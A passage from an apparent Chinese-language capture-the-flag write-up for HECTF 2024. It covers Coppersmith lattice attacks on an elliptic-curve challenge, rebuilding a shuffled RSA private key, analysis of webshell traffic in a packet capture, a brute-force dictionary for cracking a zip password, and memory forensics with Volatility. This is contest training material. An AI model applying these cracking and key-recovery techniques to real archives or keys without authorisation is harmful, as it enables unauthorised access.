f.base_ring()</span><br><span class="line">        N = R.cardinality()</span><br><span class="line">        </span><br><span class="line">        f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">        f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">        G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">                base = N^(m-i) * f^i</span><br><span class="line">                <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">                        g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">                        G.append(g)</span><br><span class="line"></span><br><span class="line">        B, monomials = G.coefficient_matrix()</span><br><span class="line">        monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">        factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">                B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">        B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">        B = B.change_ring(QQ)</span><br><span class="line">        <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">                B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line"></span><br><span class="line">        H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B*monomials):</span><br><span class="line">                H.append(h)</span><br><span class="line">                I = H.ideal()</span><br><span class="line">                <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">                        H.pop()</span><br><span class="line">                <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">                        roots = []</span><br><span class="line">                        <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                                roots.append(root)</span><br><span class="line">                        <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">p = <span class="number">9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class="line">q = <span class="number">7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class="line">a = <span class="number">4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class="line">b = <span class="number">5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class="line">x1 = <span class="number">5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403</span></span><br><span class="line">Ep_point = (<span class="number">0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span>, <span class="number">0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span>)</span><br><span class="line">c = [<span class="number">36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820</span>, <span class="number">20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332</span>, <span class="number">19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277</span>, <span class="number">45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461</span>]</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">Ep = EllipticCurve(GF(p), [a, <span class="number">0</span>])</span><br><span class="line">y1 = Ep.lift_x(x1).xy()[<span class="number">1</span>]</span><br><span class="line">G = Ep(x1,y1)</span><br><span class="line">P = Ep(Ep_point)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">G2 = G</span></span><br><span class="line"><span class="string">for k in trange(1,60000):</span></span><br><span class="line"><span class="string">    if G2 == P:</span></span><br><span class="line"><span class="string">        print(k)</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">    G2 += G</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 51517</span></span><br><span class="line"></span><br><span class="line">key = <span class="number">51517</span></span><br><span class="line"><span class="keyword">assert</span> P == key*G</span><br><span class="line"></span><br><span class="line">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class="line">aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line">En = EllipticCurve(Zmod(n), [a, b])</span><br><span class="line"></span><br><span class="line"><span class="comment"># (2G).x ^ x0 = c0</span></span><br><span class="line"><span class="comment"># (2G).y ^ x1 = c1</span></span><br><span class="line"><span class="comment"># (4G).x ^ x2 = c2</span></span><br><span class="line"><span class="comment"># (4G).x ^ x3 = c3</span></span><br><span class="line">P.&lt;x,y&gt;=PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">x0 = (c[<span class="number">0</span>] &gt;&gt; <span class="number">128</span>) &lt;&lt; <span class="number">128</span></span><br><span class="line">y0 = (c[<span class="number">1</span>] &gt;&gt; <span class="number">128</span>) &lt;&lt; <span class="number">128</span></span><br><span class="line">f = (x0+x)^<span class="number">3</span> + a*(x0+x) + b - (y0+y)^<span class="number">2</span></span><br><span class="line">r = small_roots(f, [<span class="number">2</span>^<span class="number">128</span>,<span class="number">2</span>^<span class="number">128</span>], m=<span class="number">4</span>, d=<span class="number">3</span>)</span><br><span class="line">x_2G = x0 + r[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">y_2G = y0 + r[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">P_2G  = En(x_2G, y_2G)</span><br><span class="line"><span class="built_in">print</span>(P_2G)</span><br><span class="line"></span><br><span class="line">x0 = (c[<span class="number">2</span>] &gt;&gt; <span class="number">128</span>) &lt;&lt; <span class="number">128</span></span><br><span class="line">y0 = (c[<span class="number">3</span>] &gt;&gt; <span class="number">128</span>) &lt;&lt; <span class="number">128</span></span><br><span class="line">f = (x0+x)^<span class="number">3</span> + a*(x0+x) + b - (y0+y)^<span class="number">2</span></span><br><span class="line">r = small_roots(f, [<span class="number">2</span>^<span class="number">128</span>,<span class="number">2</span>^<span class="number">128</span>], m=<span class="number">4</span>, d=<span class="number">3</span>)</span><br><span class="line">x_4G = x0 + r[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">y_4G = y0 + r[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">P_4G  = En(x_4G, y_4G)</span><br><span class="line"><span class="built_in">print</span>(P_4G)</span><br><span class="line"></span><br><span class="line">cc0 = <span class="built_in">int</span>(P_2G.xy()[<span class="number">0</span>]) ^^ c[<span class="number">0</span>]</span><br><span class="line">cc1 = <span class="built_in">int</span>(P_2G.xy()[<span class="number">1</span>]) ^^ c[<span class="number">1</span>]</span><br><span class="line">cc2 = <span class="built_in">int</span>(P_4G.xy()[<span class="number">0</span>]) ^^ c[<span class="number">2</span>]</span><br><span class="line">cc3 = <span class="built_in">int</span>(P_4G.xy()[<span class="number">1</span>]) ^^ c[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c_ <span class="keyword">in</span> [cc0,cc1,cc2,cc3]:</span><br><span class="line">    m += aes.decrypt(long_to_bytes(c_))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;30C270291b3da6c12ai341s5aNqaTtb2cd1ae2gA4e41319DEA876D6B896E0599&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>HECTF&#123;30C270291b3da6c12ai341s5aNqaTtb2cd1ae2gA4e41319DEA876D6B896E0599&#125;</code>。</p><p>​    </p><h3 id="情书与破碎的证书"><a href="#情书与破碎的证书" class="headerlink" title="情书与破碎的证书"></a>情书与破碎的证书</h3><blockquote><p>小明喜欢上了小红，他使用rsa向小红发送了无数封含有中文字符的情书。终于小红忍不住了，找到了大嘿阔将小明的私钥证书打成碎片，移除了中间的内容并把上下段的私钥部分转化成16进制，以九个为一组用相同的方式打乱（转化时产生的0d0a换行符已被移除）。作为密码学大佬的你能恢复证书，找出小红忍无可忍的证据么？</p><p><strong>提示1</strong> 情书与破碎的证书 hint1:字符中含有中文 常规输出方法无效，请使用 PKCS1_OAEP 解密器，并使用 cipher.decrypt() 解密密文（毕竟考点是证书）</p></blockquote><p>pem内容16进制转字符，后面有 <code>-----END PRIVATE KEY-----</code>，是私钥文件。</p><p>根据 <code>以九个为一组用相同的方式打乱（转化时产生的0d0a换行符已被移除）</code>，尝试分割：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0d30000102bc048230</span><br><span class="line">010df78648862a0906</span><br><span class="line">30a604820400050101</span><br><span class="line">018202000102a20482</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>按私钥格式为 <code>3082</code> 开头，可知前半部分是每9个字符逆序，后半部分不变。</p><p>还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">first_rev = <span class="string">&#x27;0d30000102bc048230010df78648862a090630a604820400050101018202000102a20482238d771399dbbd0001416e7fbd7f589b44151fb0c984549c1c4d948984f85c35934453bfbb4dbb99420f63f9cb8f577a7b60d67bdf84166c500fa7d6c6e484b75d97e308151b31a49c5bd77dd1d2d6711e50d9f5f7bc37d4e2235cfd76a522713c766e240aa2eb5fb45a9015d1dbd6a58b5b28861233ae4eb75a97ced0b78e91024d195adde08f7430b7f160d1d60a4f9d0801db74ebc8c23f9397251faac5500d216acc623e8f6ab212b5e6e9495d5ef6cee995fea98f40b1db2d356dd3c4d2612c64a1295bb23936fad66dc5662cb4ba6a8929591f6b14ce30d67df5ec35edb1f0973f746bcc5fc1ca921ee9660e04c6f286677b92e12b61ba310501030219e5085e5254046204000182020100&#x27;</span></span><br><span class="line">first = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">bytes</span>.fromhex(first_rev[<span class="number">18</span>*i:<span class="number">18</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>].<span class="built_in">hex</span>() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(first_rev)//<span class="number">18</span>)])</span><br><span class="line"><span class="built_in">print</span>(first)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 308204bc020100300d06092a864886f70d0101010500048204a6308204a20201000282010100bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519020301000102820100046204</span></span><br></pre></td></tr></table></figure><p>按私钥格式拆分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">前半段：</span><br><span class="line">308204bc</span><br><span class="line"></span><br><span class="line">0201</span><br><span class="line">00300d06092a864886f70d0101010500048204a6308204a2</span><br><span class="line"></span><br><span class="line">0201</span><br><span class="line">00</span><br><span class="line"></span><br><span class="line">【n】</span><br><span class="line">02820101</span><br><span class="line">00bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519</span><br><span class="line"></span><br><span class="line">【e】</span><br><span class="line">0203</span><br><span class="line">010001</span><br><span class="line"></span><br><span class="line">028201</span><br><span class="line">00046204</span><br><span class="line"></span><br><span class="line">后半段：</span><br><span class="line">d48d90d80f</span><br><span class="line"></span><br><span class="line">【d mod (p-1)】</span><br><span class="line">028180</span><br><span class="line">51a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf</span><br><span class="line"></span><br><span class="line">【d mod (q-1)】</span><br><span class="line">028180</span><br><span class="line">0fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd</span><br><span class="line"></span><br><span class="line">【(inverse of q) mod p】</span><br><span class="line">028180</span><br><span class="line">25c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a</span><br><span class="line"></span><br><span class="line">2d2d2d2d2d454e442050524956415445204b45592d2d2d2d2d</span><br></pre></td></tr></table></figure><p>已知 $n,e,c,dp,dq,\text{inv}(q,p)$，根据hint1，采用了OAEP加密方式，解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x00bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519</span></span><br><span class="line">e = <span class="number">0x010001</span></span><br><span class="line">dp = <span class="number">0x51a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf</span></span><br><span class="line">dq = <span class="number">0x0fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd</span></span><br><span class="line">c = <span class="number">0x6f4cb0df50eb133f104727316eb23e25463b6b46a1ff743507c7663094da88a091c77c1d686a91613fa2da697c23924798b40654ba420b9690c5ceb9a362cf48e72c39177c6a3ebecc4e0ba2b9673f070a23e535fff7a01b400381ede60a6f9bf86047b3dd2c663c329b9287749bdb3783303802129b93af083aa2045c500fe0c2a7a018c2403881115927ae56ff14338b9fb98d5a5f461916d962aea7c3379ec7f7d8d77b4cc8ff756895c1500d9f2cee3552f17216339b0d67f27e0dd07e9ec1861f14c962b977559561d709d57e58fd6e6aafd27892c6d43d16b3db267902b9ce8f9ff89a66ab822b5ea3a68c872a32c69961df15581b70c00e4c61804d0d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> e * dp % x == <span class="number">1</span>:</span><br><span class="line">        p = (e * dp - <span class="number">1</span>) // x + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">            q = n // p</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,f)</span><br><span class="line"></span><br><span class="line">rsa_components = (n, e, d, p, q)</span><br><span class="line">myrsa = RSA.construct(rsa_components)</span><br><span class="line">rsakey = RSA.importKey(myrsa.exportKey())</span><br><span class="line">rsakey = PKCS1_OAEP.new(rsakey)</span><br><span class="line">m = rsakey.decrypt(long_to_bytes(c))</span><br><span class="line"><span class="built_in">print</span>(m.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你知道么，rsa的大数分解的坚固就像爱情一样坚不可摧，你愿意让我们也像rsa一样坚不可摧么?但是你并不关心结局，你只关心你的flag:HECTF&#123;t1an_dog_no_g3t_g00d_d1e&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="恶势力的仓库"><a href="#恶势力的仓库" class="headerlink" title="恶势力的仓库"></a>恶势力的仓库</h3><blockquote><p>恶势力的仓库惨遭毒手，就代表着毒手伸进了恶势力的仓库</p></blockquote><p>wireshark分析。</p><p>查看HTTP流，在流14，<code>a.jpg.php</code> ，识别为蚁剑流量。</p><p>将各个流的POST数据去头去尾，base64解码。</p><p>流16列目录，流17提取出gif图，流18提取出png图，结尾有base64字符串，解码得：</p><p><code>Although there is nothing here, I still have a hint prepared for you: perhaps you&#39;ve seen the password before!!!</code></p><p>流19提取出7z文件。</p><p>往前查看流，流7的POST数据：</p><p><code>&#123;&quot;data&quot;:&#123;&quot;username&quot;:&quot;hue=8zZvR2YzlWb&quot;,&quot;password&quot;:&quot;YI6=ECZvd2YzlWb&quot;&#125;&#125;</code></p><p>疑似逆序base64，password的值逆序后解base64得到 <code>miscgod!</code>，以此为密码解开7z压缩包。</p><p><code>机密文件.xlsx</code> 中单元格只有0/1两种值，将值为1的单元格全局替换为黑色，全局缩小调行高，是一个二维码，扫码得到flag：<code>HECTF&#123;Y0u_are_m1sc_ggg9gggggggg9gggggggg9god&#125;</code>。</p><p>​    </p><h3 id="2024HECTF俺来了！！！"><a href="#2024HECTF俺来了！！！" class="headerlink" title="2024HECTF俺来了！！！"></a>2024HECTF俺来了！！！</h3><blockquote><p>关注凌武科技公众号，发送2024HECTF俺来辣！！！，有神秘惊喜！！！</p></blockquote><p>公众号发关键词，flag：<code>HECTF&#123;Welcome_To_2024_HECTF!!!&#125;</code>。</p><p>​    </p><h3 id="简单的压缩包"><a href="#简单的压缩包" class="headerlink" title="简单的压缩包"></a>简单的压缩包</h3><blockquote><p>w41tm00n是个kisaki推，某天在水群的时候，一个同为kisaki推的g01den在群里分享了个压缩包，并留言里面有一张kisaki的图，同时里面还存在着神秘的信息（这里是flag），w41tm00n对此很感兴趣，你可以帮他得到神秘的信息（flag）吗？</p></blockquote><p><code>Re.txt</code> 中提示：<code>正则 ^([a-z])&#123;2&#125;\d([^a-z])\D$</code>，生成字典文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">lcase = string.ascii_lowercase</span><br><span class="line">ucase = string.ascii_uppercase</span><br><span class="line">digit = string.digits</span><br><span class="line">punc = string.punctuation</span><br><span class="line"></span><br><span class="line">g = <span class="built_in">open</span>(<span class="string">&#x27;dic.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> lcase:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> lcase:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> digit:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> ucase+digit+punc:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> lcase+ucase+punc:</span><br><span class="line">                    f = a+b+c+d+e</span><br><span class="line">                    g.write(f)</span><br><span class="line">                    g.write(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用passware载入字典多进程爆破，得到密码 <code>np76_</code>，解压得到 <code>kisaki.png</code>，提取末尾的zip。</p><p><code>getZip.py</code> 里面是AES-CBC加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key,iv</span>):</span><br><span class="line">    data = content</span><br><span class="line">    cipher1 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ct = cipher1.encrypt(pad(data, <span class="number">16</span>))</span><br><span class="line">    ct_hex = binascii.b2a_hex(ct)</span><br><span class="line">    <span class="keyword">return</span> ct_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;oringe.zip&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv  = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line"></span><br><span class="line">en = encrypt(key,iv)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zip2.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(en)</span><br></pre></td></tr></table></figure><p>解密data即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = b&quot;abcdefghijklmnop&quot;</span><br><span class="line">iv  = b&quot;qwertyuiopasdfgh&quot;</span><br><span class="line">c = &#x27;cf5663613ce2bbd8ef6d3c522bcafa667ed985d67ba6ca2a21ce970c59e331dd7e090f248786c0ef8764395f1bb0aac136f1397d0a18ff55546473107fa7e5a385855cad91dda16ba4951e2f6618995b6faeecfaa1da7d3bd6ec66a4f57d6fae638a85da1cfdad89941512e9a0f7af49d33e285f4b56d66702ad4b4c1676824451125aaca20c1c74f9954d9546f9b5c059a990aae074c255cccf2866058ffa51159d6d0d67bfdbb3e233d27cb481709dd07fede7c9b28be6d7d581f2b7d476616cbc14a8133a23392eac733336d59cb42d6f5fe9a500eb340cf19dca8d6ddb47117d5a332f47b7fc260f4d1e1b8a2654b52d6403dc1376be22a6dcb9d8a72321acac5f63b59c8b82190629f644ee98757124d7883bfbe41df9d0b524e736da6bd0b54b37ce8c9b4f583b534052233a1a27f96be446e2f7e88eb2f8b4e0d84438546098c149d9ed511356726ff2bfdbdf&#x27;</span><br></pre></td></tr></table></figure><p>解出zip直接查看 <code>flag.txt</code> 有flag：<code>HECTF&#123;c292af1-2b2ee35-6398bd4934f7626afc&#125;</code>。</p><p>​    </p><h3 id="恶势力的聊天记录"><a href="#恶势力的聊天记录" class="headerlink" title="恶势力的聊天记录"></a>恶势力的聊天记录</h3><blockquote><p>附件下载地址： 链接：<a href="https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</a>  提取码：o07y</p></blockquote><p>volatility分析内存镜像文件：</p><p><code>volatility -f image.vmem imageinfo</code></p><p><code>volatility -f image.vmem --profile=Win7SP1x64 cmdline</code></p><p>结合题目，查到和微信相关的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Users\aja\AppData\Roaming\Tencent\WeChat\XPlugin\Plugins\RadiumWMPF\11275\extracted\runtime\WeChatAppEx.exe&quot; --log-level=2 --helper-handle-value=69441000 --wechat-files-path=&quot;C:\Users\aja\Documents\WeChat Files\\&quot; --product-id=1000 --wechat-sub-user-agent=&quot;MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090c11)&quot; --wmpf_extra_config=&quot;&#123; \&quot;reportId\&quot;:-1, \&quot;version\&quot;:11275 &#125;&quot; --web-translate --client_version=1661537297 --mojo-platform-channel-handle=2084</span><br><span class="line"></span><br><span class="line">&quot;C:\Users\aja\AppData\Roaming\Tencent\WeChat\XPlugin\Plugins\ThumbPlayer\4073\extracted\WeChatPlayer.exe&quot; --user-lib-dir=&quot;C:\Program Files\Tencent\WeChat\[3.9.12.17]&quot; 